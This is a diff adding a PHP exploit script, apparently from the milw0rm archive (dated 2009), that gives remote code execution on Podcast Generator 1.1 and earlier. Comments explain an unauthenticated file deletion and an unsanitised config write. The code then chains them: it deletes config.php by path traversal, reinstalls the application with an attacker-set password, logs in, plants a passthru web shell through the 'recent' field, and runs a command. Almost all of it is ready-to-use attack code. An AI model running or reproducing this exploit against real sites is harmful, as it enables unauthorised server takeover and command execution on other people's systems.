@@ -1,0 +1,208 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "
+
+Podcast Generator <= 1.1 Remote Code Execution
+
+Vendor: http://podcastgen.sourceforge.net
+Exploit Author: BlackHawk
+Author's Site: http://itablackhawk.altervista.org
+
+Credits goes to RGod for the code
+Thanks to Marija just for exist :)
+
+
+";
+if ($argc<4) {
+echo "
+
+Usage: php ".$argv[0]." host /path/ command
+
+		Es: php ".$argv[0]." localhost / dir
+
+";
+die;
+}
+/*
+Bugs explanation:
+
+This app has tons of bugs, but because of his structure lot of them are useless.. but not them all!
+
+Look at 'core/admin/delete.php' (i have omitted the author comments):
+
+---------------------------
+
+<?php
+if (isset($_REQUEST['absoluteurl']) OR isset($_REQUEST['amilogged']) OR isset($_REQUEST['theme_path'])) { exit; } 
+if (isset($_GET['file']) AND $_GET['file']!=NULL) {
+	$file = $_GET['file']; 
+	$ext = $_GET['ext'];
+	if (file_exists("$absoluteurl$upload_dir$file.$ext")) {
+		unlink ("$upload_dir$file.$ext");
+		$PG_mainbody .="<p><b>$file.$ext</b> $L_deleted</p>";
+	}
+
+---------------------------
+
+no check for admin rights, so now we can delete whatever file we want, with any exstension..
+
+so let's delete config.php and make a rfesh new installation with a password set by us!
+
+the RCE is triggered in 'core/admin/scriptconfig.php', line 56:
+
+---------------------------
+// recent in home
+$recent = $_POST['recent'];
+if ($recent != "") {
+	$max_recent = $recent;
+}
+---------------------------
+
+no sanitize of the input and no quotes added when writting to the config file (so no need mq=off)
+BlackHawk <hawkgotyou@gmail.com>
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+
+$cmd="";
+for ($i=3; $i<=$argc-1; $i++){
+$cmd.=" ".$argv[$i];
+}
+$port=80;
+$proxy="";
+
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "Step1 - Delete config.inc\r\n";
+$packet ="GET ".$p."core/admin/delete.php?file=../../config&ext=php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+echo "Step2 - Creating new configuration\r\n";
+
+$data="username=new_user_name&password=blackhawk&password2=blackhawk&setuplanguage=en";
+$packet="POST ".$p."/setup/index.php?step=5 HTTP/1.0\r\n";
+$packet.="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+echo "Step3 - Logging in\r\n";
+$data="user=new_user_name&password=blackhawk";
+$packet="POST ".$p."?p=admin HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(" ",$temp[1]);
+$PHPid = $temp2[0];
+
+
+echo "Step4 - Sending shell\r\n";
+$data="streaming=yes&fbox=yes&cats=yes&newsinadmin=yes&strictfilename=yes&recent=5; if (isset(\$_GET[cmd])){if(get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}echo 666999;passthru(\$_GET[cmd]);echo 666999;}\$xyz=5&recentinfeed=All&selectdateformat=d-m-Y&scriptlanguage=en";
+$packet="POST ".$p."?do=config&p=admin&action=change HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: $PHPid\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+echo "Step5 - Executing Command\r\n\r\n";
+$packet ="GET ".$p."config.php?cmd=dir HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"666999"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("666999",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+?>
+
+# milw0rm.com [2009-03-31]
